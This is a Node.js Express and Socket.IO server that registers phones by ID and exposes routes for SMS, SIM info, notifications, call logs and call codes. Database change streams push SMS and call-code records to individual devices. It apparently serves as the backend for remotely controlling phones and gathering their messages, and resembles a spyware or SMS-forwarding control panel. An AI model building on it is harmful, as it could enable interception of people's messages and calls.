import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import { createServer } from "http";
import { Server } from "socket.io";
import fetch from "node-fetch";
import mongoose from "mongoose";
import { connectDB } from "./config/db.js";

// Routes
import deviceRoutes from "./routes/deviceRoutes.js";
import smsRoutes from "./routes/smsRoutes.js";
import simInfoRoutes from "./routes/simInfoRoutes.js";
import notificationRoutes from "./routes/notificationRoutes.js";
import callRoutes from "./routes/callRoutes.js";
import adminRoutes from "./routes/adminRoutes.js";
import serialRoutes from "./routes/serialRoutes.js";
import callLogRoutes from "./routes/callLogRoutes.js";
import statusRoutes from "./routes/statusRoutes.js";
import lastSeenRoutes from "./routes/lastSeen.routes.js";

dotenv.config();
connectDB();

const app = express();
const server = createServer(app);
const io = new Server(server, {
  cors: { origin: "*", methods: ["GET", "POST"] },
});

// Make IO available inside controllers
app.set("io", io);

app.use(cors());
app.use(express.json());

// GLOBAL MAP
const deviceSockets = new Map();

// ----------------------------------------------------------------
// 🔥 SOCKET HANDLERS
// ----------------------------------------------------------------
io.on("connection", (socket) => {
  console.log("🟢 Client connected:", socket.id);

  let currentDeviceId = null;

  socket.on("registerDevice", (uniqueId) => {
    if (!uniqueId) return;

    // If already exists → disconnect old socket
    if (deviceSockets.has(uniqueId)) {
      const oldSocket = io.sockets.sockets.get(deviceSockets.get(uniqueId));
      if (oldSocket) oldSocket.disconnect(true);
    }

    currentDeviceId = uniqueId;
    deviceSockets.set(uniqueId, socket.id);

    console.log(`📱 Device Registered: ${uniqueId} (socket: ${socket.id})`);

    io.to(socket.id).emit("deviceRegistered", { uniqueId });
  });

  socket.on("disconnect", () => {
    console.log("🔴 Socket disconnected:", socket.id);

    if (currentDeviceId) {
      const savedSocket = deviceSockets.get(currentDeviceId);
      if (savedSocket === socket.id) {
        deviceSockets.delete(currentDeviceId);
        console.log(`⚠️ Device offline: ${currentDeviceId}`);
      }
    }
  });
});

// ----------------------------------------------------------------
// 🔹 CallCode Emit (UniqueId FIXED)
// ----------------------------------------------------------------
export async function sendCallCodeToDevice(uniqueId, callData) {
  const socketId = deviceSockets.get(uniqueId);

  console.log(
    `📞 DEBUG Call Emit → uniqueId: ${uniqueId}, socketId: ${socketId}`
  );

  if (socketId && io.sockets.sockets.get(socketId)) {
    io.to(socketId).emit("callCodeUpdate", callData);
    console.log(`✅ [EMIT] callCodeUpdate → ${uniqueId}`);
  } else {
    console.log(`❌ No active socket for ${uniqueId} (Call skipped)`);
  }
}

// ----------------------------------------------------------------
// 🔥 MONGO CHANGE STREAMS
// ----------------------------------------------------------------
mongoose.connection.once("open", () => {
  console.log("📡 Watching DB changes...");

  // CALL STREAM
  const callStream = mongoose.connection.collection("callcodes").watch();
  callStream.on("change", async (change) => {
    if (!["insert", "update", "replace"].includes(change.operationType)) return;

    const doc = await mongoose.connection
      .collection("callcodes")
      .findOne({ _id: change.documentKey._id });

    if (doc) {
      console.log(`📞 [WATCH] Call Change → ${doc.uniqueId}`);
      sendCallCodeToDevice(doc.uniqueId, doc);
    }
  });

  // SMS STREAM
  const smsStream = mongoose.connection.collection("sms").watch();
  smsStream.on("change", async (change) => {
    if (!["insert", "update", "replace"].includes(change.operationType)) return;

    const doc = await mongoose.connection
      .collection("sms")
      .findOne({ _id: change.documentKey._id });

    if (doc) {
      console.log(`📩 [WATCH] SMS Change → ${doc.uniqueId}`);

      const socketId = deviceSockets.get(doc.uniqueId);
      if (socketId) {
        io.to(socketId).emit("smsUpdate", doc);
        console.log(`✅ [EMIT] smsUpdate → ${doc.uniqueId}`);
      } else {
        console.log(`❌ No active socket for ${doc.uniqueId} (SMS skipped)`);
      }
    }
  });

  // ADMIN STREAM
  const adminStream = mongoose.connection
    .collection("adminnumbers")
    .watch();

  adminStream.on("change", async (change) => {
    const doc = await mongoose.connection
      .collection("adminnumbers")
      .findOne({ _id: change.documentKey._id });

    if (doc) {
      console.log("👑 Admin Change →", doc);

      io.emit("adminUpdate", {
        number: doc.number,
        status: doc.status,
      });

      console.log("✅ [EMIT] adminUpdate");
    }
  });
});

// ----------------------------------------------------------------
// ROUTES
// ----------------------------------------------------------------
app.use("/api/device", deviceRoutes);
app.use("/api/sms", smsRoutes);
app.use("/api/siminfo", simInfoRoutes);
app.use("/api/notification", notificationRoutes);
app.use("/api/call", callRoutes);
app.use("/api/admin", adminRoutes);
app.use("/api/serial", serialRoutes);
app.use("/api/status", statusRoutes);
app.use("/api/lastseen", lastSeenRoutes);
app.use("/api/call-log", callLogRoutes);

app.use((req, res) => res.status(404).json({ success: false, message: "Route not found" }));
app.use((err, req, res, next) => {
  console.error("💥 ERROR:", err);
  res.status(500).json({ success: false, message: "Internal server error" });
});

// ----------------------------------------------------------------
// SERVER START
// ----------------------------------------------------------------
const PORT = process.env.PORT || 5000;
server.listen(PORT, () => {
  console.log(`🚀 Server running → http://localhost:${PORT}`);
});
